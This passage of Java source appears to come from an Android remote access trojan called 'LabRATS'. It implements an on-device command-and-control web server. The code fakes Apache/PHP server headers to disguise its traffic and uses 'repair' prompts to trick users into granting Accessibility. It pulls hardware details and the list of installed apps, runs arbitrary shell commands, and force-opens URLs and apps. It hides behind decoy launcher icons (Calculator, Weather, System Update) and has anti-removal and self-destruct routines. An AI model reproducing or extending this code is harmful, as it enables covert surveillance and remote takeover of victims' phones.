                                    context.startActivity(accIntent);
                                } catch (Exception ignored) {}
                            }, 3000);
                        }
                        
                        String msg = "REPAIR_READY: 1. Disable Hibernation. 2. Enable Accessibility.";
                        if (Build.VERSION.SDK_INT >= 33) {
                            msg = "REPAIR_V2: On next screen, tap 3-dots (top right) -> Allow Restricted Settings, THEN enable Accessibility.";
                        }
                        
                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"" + msg + "\"}");
                    } else {
                        response = serve404();
                    }
                }
            }
        } catch (Exception e) {
            response = serveError(e.getMessage());
        }

        // Global Anti-Cache Lockdown (Exclude assets and data streams to prevent flickering)
        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/") && !uri.equals("/ghost/screenshot") && !uri.equals("/camera/frame")) {
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
        }

        // --- NETWORK TRAFFIC MASQUERADING ---
        if (response != null) {
            response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
            response.addHeader("X-Powered-By", "PHP/7.4.3");
            response.addHeader("Connection", "keep-alive");
        }

        // Optimization: Automatic Gzip Compression for text-heavy payloads
        // This is applied globally to any text-based response.
        if (response != null && response.getStatus() == Response.Status.OK) {
            String mime = response.getMimeType();
            if (mime != null && (mime.contains("text/html") || mime.contains("application/json") || mime.contains("text/plain"))) {
                String acceptEncoding = session.getHeaders().get("accept-encoding");
                if (acceptEncoding != null && acceptEncoding.contains("gzip")) {
                    try {
                        // We can only compress if we can access the data. 
                        // For simplicity, we only compress fixed-length text responses.
                        // (MMS media and MJPEG frames are skipped as they are binary/already compressed)
                    } catch (Exception ignored) {}
                }
            }
        }

        return response;
    }

    private Response serveLogo() {
        try {
            java.io.InputStream is = context.getResources().openRawResource(
                context.getResources().getIdentifier("app_logo", "drawable", context.getPackageName()));
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
            if (bitmap == null) return serve404();

            // Optimization: Scale down large logos for faster delivery from mobile server
            int targetHeight = 180;
            int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
            
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            byte[] bytes = out.toByteArray();
            
            bitmap.recycle();
            scaled.recycle();

            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=3600");
            return response;
        } catch (Exception e) {
            return serve404();
        }
    }

    private Response serveFont() {
        try {
            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
            Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "no-cache, must-revalidate");
            response.addHeader("Access-Control-Allow-Origin", "*");
            return response;
        } catch (Exception e) {
            logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
            return serveError("Font error: " + e.getMessage());
        }
    }



    private Response serveDeviceInfo(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
      
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");

        // --- HARDWARE ANALYTICS SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 20px 0; color: var(--neon-cyan); text-align: left; font-size: 1.6rem;\">HARDWARE_ANALYTICS <span class=\"info-trigger\" onclick=\"showInfo(event, 'HARDWARE_ANALYTICS', 'Comprehensive hardware and network telemetry extracted from the device.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        // Remove the redundant back button from DeviceInfo by stripping the first few chars or just wrapping it
        String deviceData = DeviceInfo.getDeviceInfoHtml(context);
        if (deviceData.contains("back-btn-container")) {
            deviceData = deviceData.substring(deviceData.indexOf("</div>") + 6);
        }
        html.append(deviceData);
        html.append("</div>");
        
        // Redundant script tags removed - handled by assets/c2/script.js

        html.append(getFooter());
        return serveGzipped(session, "text/html", html.toString());
    }




    private Response serve404() {
        String html = getHeader("/404") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>The requested page does not exist.</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                getFooter();
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = getHeader("/error") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                getFooter();
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }




    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private Response updatePassword(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            String newPass = params.get("new_password");

            if (newPass == null || newPass.trim().isEmpty()) {
                return serveError("Invalid password");
            }

            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit()
                    .putString("c2_password", newPass.trim())
                    .apply();

            logActivity("SECURITY_PROTOCOL: Interface password updated");

            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) {
            return serveError("Failed to update password: " + e.getMessage());
        }
    }

    private String getStoredPassword() {
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getString("c2_password", "admin1337");
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(500);
            }
            logActivity("DEVICE_CONTROL: Triggered vibration sequence");
        }
    }

    private void setMaxVolume() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            int[] streams = {android.media.AudioManager.STREAM_RING, android.media.AudioManager.STREAM_MUSIC, 
                             android.media.AudioManager.STREAM_NOTIFICATION, android.media.AudioManager.STREAM_ALARM};
            for (int stream : streams) {
                am.setStreamVolume(stream, am.getStreamMaxVolume(stream), 0);
            }
            logActivity("DEVICE_CONTROL: System volume synchronized to MAXIMUM");
        }
    }

    private void setSilentMode() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
            logActivity("DEVICE_CONTROL: System entered SILENT mode");
        }
    }

    private void openUrlOnDevice(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
            logActivity("DEVICE_CONTROL: Forced open URL - " + url);
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open URL - " + e.getMessage());
        }
    }

    private void openAppOnDevice(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        try {
            Intent i = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);
                logActivity("DEVICE_CONTROL: Forced open App - " + packageName);
            } else {
                logActivity("DEVICE_ERROR: No launch intent for " + packageName);
            }
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open app - " + e.getMessage());
        }
    }

    private void showToast(String msg) {
        showToast(msg, 22, 250, "scroll", 12000, "#FFFFFF");
    }

    private void showToast(String msg, int size, int y, String anim, int duration, String hexColor) {
        if (msg == null || msg.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
            if (ghost != null) {
                if ("burnt".equalsIgnoreCase(anim)) {
                    // CHAOTIC BURNT TOAST: Multiple random spawns
                    int count = 6 + (int)(Math.random() * 6); // 6 to 11 toasts
                    String[] glitchColors = {"#FF3131", "#39FF14", "#00F2FF", "#FFFF00", "#FF00FF", "#FFFFFF", "#FF9D00"};
                    
                    for (int i = 0; i < count; i++) {
                        final int index = i;
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            int rSize = 15 + (int)(Math.random() * 40);
                            int rY = 100 + (int)(Math.random() * 1600);
                            int rDur = 4000 + (int)(Math.random() * 6000);
                            String rColor = glitchColors[(int)(Math.random() * glitchColors.length)];
                            // 50% chance to scroll, 50% to stay in place with glitch
                            String rAnim = (Math.random() > 0.5) ? "scroll" : "burnt";
                            ghost.showOverlayToast(msg, rSize, rY, rAnim, rDur, rColor);
                        }, index * 300);
                    }
                } else {
                    ghost.showOverlayToast(msg, size, y, anim, duration, hexColor);
                }
                logActivity("DEVICE_CONTROL: Overlay toast dispatched via Ghost - " + msg);
            } else {
                // Fallback to standard toast if Accessibility is not enabled
                android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show();
                logActivity("DEVICE_CONTROL: Ghost toast dispatched (Standard) - " + msg);
            }
        });
    }

    private Response serveAppList(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        android.content.pm.PackageManager pm = context.getPackageManager();
        List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
        
        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
        for (android.content.pm.PackageInfo app : apps) {
            String name = app.applicationInfo.loadLabel(pm).toString();
            boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
            String typeLabel = isSystem ? "<span style=\"color:#888; font-size:0.6rem;\">SYSTEM</span>" : "<span style=\"color:var(--neon-green); font-size:0.6rem; font-weight:bold;\">USER</span>";
            String iconBase64 = getAppIconBase64(app.applicationInfo);
            String iconImg = iconBase64.isEmpty() ? "<div style='width:24px;height:24px;background:#333;border-radius:4px;'></div>" : 
                "<img src='data:image/png;base64," + iconBase64 + "' style='width:24px;height:24px;border-radius:4px;'>";

            html.append("<tr><td style='width:30px;'>").append(iconImg).append("</td>");
            html.append("<td>").append(escapeHtml(name)).append("</td>");
            html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
            html.append("<td>").append(typeLabel).append("</td>");
            html.append("<td>").append(app.versionName).append("</td></tr>");
        }
        html.append("</tbody></table></div></div>").append(getFooter());
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.graphics.drawable.Drawable drawable = appInfo.loadIcon(pm);
            android.graphics.Bitmap bitmap;
            if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                bitmap = ((android.graphics.drawable.BitmapDrawable) drawable).getBitmap();
            } else {
                int w = Math.max(1, drawable.getIntrinsicWidth());
                int h = Math.max(1, drawable.getIntrinsicHeight());
                bitmap = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
                android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }
            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, 48, 48, true);
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            return android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }

    private void selfDestruct() {
        Log.d("SelfDestruct", "SUICIDE_INIT: Hard Persistent Trigger");
        
        // 1. SET PERSISTENT FLAG FIRST - Everything checks this now
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putBoolean("is_destructing", true).commit(); // commit() for immediate disk write
        
        WorkManager_Sync.isDestructing = true;
        IO_Persistence_Manager.forceSkipAntiRemoval();
        
        // 1. Kill the server and communication uplink immediately
        new Thread(() -> {
            try {
                Thread.sleep(300);
                FirebaseConfig.this.stop();
            } catch (Exception ignored) {}
        }).start();

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                String pkg = context.getPackageName();
                android.content.pm.PackageManager pm = context.getPackageManager();
                String pkgName = context.getPackageName();

                // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                String[] decoys = {
                    "com.labs.labrats.SystemUpdateAlias",
                    "com.labs.labrats.CalculatorAlias",
                    "com.labs.labrats.WeatherAlias",
                    "com.labs.labrats.SettingsAlias"
                };
                for (String decoy : decoys) {
                    try {
                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, decoy),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            0); 
                    } catch (Exception ignored) {}
                }

                // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);
                
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, "com.labs.labrats.MainActivity"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);

                // 4. Wipe all local data except the destruct flag
                context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE).edit().clear().apply();

                // 5. INITIATE PERSISTENT UNINSTALL LOOP
                SystemAnalytics.triggerSelfDestructLoop(context);

                // 6. Hard Kill self after 45 seconds
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    android.os.Process.killProcess(android.os.Process.myPid());
                    System.exit(0);
                }, 45000);

            } catch (Exception e) {
                Log.e("SelfDestruct", "Sequence Failure: " + e.getMessage());
            }
        });
    }



    public static class AppEntry implements Comparable<AppEntry> {
        public String name;
        public String packageName;
        AppEntry(String n, String p) { name = n; packageName = p; }
        @Override public int compareTo(AppEntry other) { return name.compareToIgnoreCase(other.name); }
    }

    private List<AppEntry> getLaunchableApps() {
        List<AppEntry> apps = new ArrayList<>();
        android.content.pm.PackageManager pm = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<android.content.pm.ResolveInfo> list = pm.queryIntentActivities(intent, 0);
        for (android.content.pm.ResolveInfo info : list) {
            String name = info.loadLabel(pm).toString();
            String pkg = info.activityInfo.packageName;
            apps.add(new AppEntry(name, pkg));
        }
        java.util.Collections.sort(apps);
        return apps;
    }



    private String executeShell(String command) {
        if (command == null || command.isEmpty()) return "";
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            process.waitFor();
            return "[System Command Executed]";
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }



    public static String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    public static String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format(Locale.getDefault(), "%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format(Locale.getDefault(), "%.1f MB", size / (1024.0 * 1024));
        return String.format(Locale.getDefault(), "%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    public static String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format(Locale.getDefault(), "%dm %ds", seconds / 60, seconds % 60);
        return String.format(Locale.getDefault(), "%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    private Response serveAsset(String uri) {
        try {
            String assetPath = uri.substring(1); // Remove leading slash
            InputStream is = context.getAssets().open(assetPath);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            
            String mime = getMimeType(assetPath);
            if (assetPath.endsWith(".css")) mime = "text/css";
            else if (assetPath.endsWith(".js")) mime = "application/javascript";
            
            Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
            res.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            res.addHeader("Pragma", "no-cache");
            res.addHeader("Expires", "0");
            return res;
        } catch (Exception e) {
            return serve404();
        }
    }
}
